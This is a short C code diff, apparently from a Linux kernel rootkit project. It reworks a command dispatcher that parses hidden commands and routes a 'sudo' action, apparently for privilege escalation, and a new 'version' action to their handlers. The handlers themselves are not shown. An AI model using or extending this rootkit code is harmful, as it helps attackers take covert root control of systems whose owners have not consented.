@@ -5,21 +5,20 @@
 #include "../logger/logger.h"
 #include "parser/parser.h"
 
-#include "commands/sudo/sudo.h"
-
 #include "dispatcher.h"
 
+#include "commands/version/version.h"
+#include "commands/sudo/sudo.h"
+
 // ////////////////////////////////////////////////////////////////////
 // ////////////////////////////////////////////////////////////////////
 
-int dispatcher(const char *command) {
+void dispatcher(const struct pt_regs *regs, const char *command) {
     rk_info("[dispatcher] dispatching command %s\n", command);
 
     char *action = NULL;
     char **argv = NULL;
     int argc = 0;
-
-    int ret = 0;
 
     if (parse_command(command, &action, &argv, &argc) == 0) {
         rk_info("[dispatcher] action: %s with %d args\n", action, argc);
@@ -29,13 +28,13 @@ int dispatcher(const char *command) {
         }
 
         if (strcmp(action, "sudo") == 0) {
-            ret = sudo(argv, argc);
+            sudo(regs, argv, argc);
+        } else if (strcmp(action, "version") == 0) {
+            version(regs, argv, argc);
         }
 
         free_parsed_command(action, argv, argc);
     }
-
-    return ret;
 }
 
 // ////////////////////////////////////////////////////////////////////
